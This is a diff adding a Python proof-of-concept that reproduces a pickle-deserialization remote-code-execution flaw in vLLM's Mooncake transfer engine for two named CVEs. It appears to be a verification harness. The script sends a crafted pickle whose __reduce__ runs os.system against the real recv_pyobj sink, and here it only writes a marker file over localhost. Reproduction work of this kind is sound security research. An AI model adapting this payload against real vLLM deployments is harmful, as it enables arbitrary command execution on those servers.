@@ -1,0 +1,121 @@
+"""CVE-2025-32444 / CVE-2025-29783 function-level reproduction.
+
+Loads the pinned vLLM v0.8.4 ``mooncake_pipe.py`` and invokes the real
+``MooncakeTransferEngine.recv_bytes`` against a real pyzmq PULL socket.  The
+sink is ``self.receiver_socket.recv_pyobj()``: a malicious pickle sent by any
+peer that can reach the KV pipe executes before any tuple validation.
+
+Only the non-vulnerable vLLM imports are stubbed (config/logger/base), because
+the full vLLM wheel requires a CUDA build.  The vulnerable function body is the
+verbatim upstream file selected by the manifest.
+"""
+
+from __future__ import annotations
+
+import importlib.util
+import json
+import logging
+import os
+import sys
+import types
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+import poclib  # noqa: E402
+
+
+def _load_upstream(path: Path):
+    vllm = types.ModuleType("vllm")
+    vllm.__path__ = []
+    cfg = types.ModuleType("vllm.config")
+    cfg.KVTransferConfig = object
+    logger = types.ModuleType("vllm.logger")
+    logger.init_logger = lambda name: logging.getLogger(name)
+    base = types.ModuleType("vllm.distributed.kv_transfer.kv_pipe.base")
+    base.KVPipeBase = object
+    modules = {
+        "vllm": vllm,
+        "vllm.config": cfg,
+        "vllm.logger": logger,
+        "vllm.distributed": types.ModuleType("vllm.distributed"),
+        "vllm.distributed.kv_transfer": types.ModuleType("vllm.distributed.kv_transfer"),
+        "vllm.distributed.kv_transfer.kv_pipe": types.ModuleType("vllm.distributed.kv_transfer.kv_pipe"),
+        "vllm.distributed.kv_transfer.kv_pipe.base": base,
+    }
+    sys.modules.update(modules)
+    spec = importlib.util.spec_from_file_location("uv_vllm_mooncake_pipe", path)
+    module = importlib.util.module_from_spec(spec)
+    assert spec.loader is not None
+    spec.loader.exec_module(module)
+    return module
+
+
+def main() -> None:
+    import pickle
+    import zmq
+
+    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
+    source = poclib.upstream_path(manifest["root_cause"]["source"])
+    if not source.is_file():
+        poclib.fail(f"missing pinned upstream source: {source}")
+    module = _load_upstream(source)
+
+    marker = str(poclib.MARKER_FILE)
+    text = poclib.MARKER_TEXT
+    poclib.start_marker("ABSENT")
+
+    class Evil:
+        def __reduce__(self):
+            return (os.system, (f'echo {text} > "{marker}"',))
+
+    ctx = zmq.Context()
+    pull = ctx.socket(zmq.PULL)
+    port = pull.bind_to_random_port("tcp://127.0.0.1")
+    push = ctx.socket(zmq.PUSH)
+    push.connect(f"tcp://127.0.0.1:{port}")
+    engine = object.__new__(module.MooncakeTransferEngine)
+    engine.receiver_socket = pull
+
+    payload = pickle.dumps(Evil(), protocol=4)
+    push.send(payload)
+    post_sink_error = None
+    try:
+        engine.recv_bytes()
+    except Exception as exc:  # the sink runs before allocate_managed_buffer
+        post_sink_error = f"{type(exc).__name__}: {exc}"
+    finally:
+        pull.close(0)
+        push.close(0)
+        ctx.term()
+
+    if not poclib.marker_ok():
+        poclib.fail("marker was not written by the upstream recv_pyobj sink", post_sink_error=post_sink_error)
+
+    poclib.finish_verified(
+        {
+            "transport": {
+                "type": "function+zmtp",
+                "entrypoint": "vllm.distributed.kv_transfer.kv_pipe.mooncake_pipe.MooncakeTransferEngine.recv_bytes",
+                "source": poclib.rel(source),
+                "source_sha256": poclib.sha256_file(source),
+                "socket": f"tcp://127.0.0.1:{port}",
+                "payload_sha256": poclib.sha256_text(payload.hex()),
+                "payload_protocol": 4,
+                "post_sink_error": post_sink_error,
+                "stubbed_imports": ["vllm.config", "vllm.logger", "vllm...kv_pipe.base"],
+            },
+            "request_response": [
+                {
+                    "dir": "peer -> PULL recv_pyobj",
+                    "payload": "pickle __reduce__ os.system(marker)",
+                    "result": "marker written; post-sink unpack error expected",
+                }
+            ],
+            "state_before": "marker=ABSENT",
+            "state_after": "marker contains proof text",
+        }
+    )
+
+
+if __name__ == "__main__":
+    main()
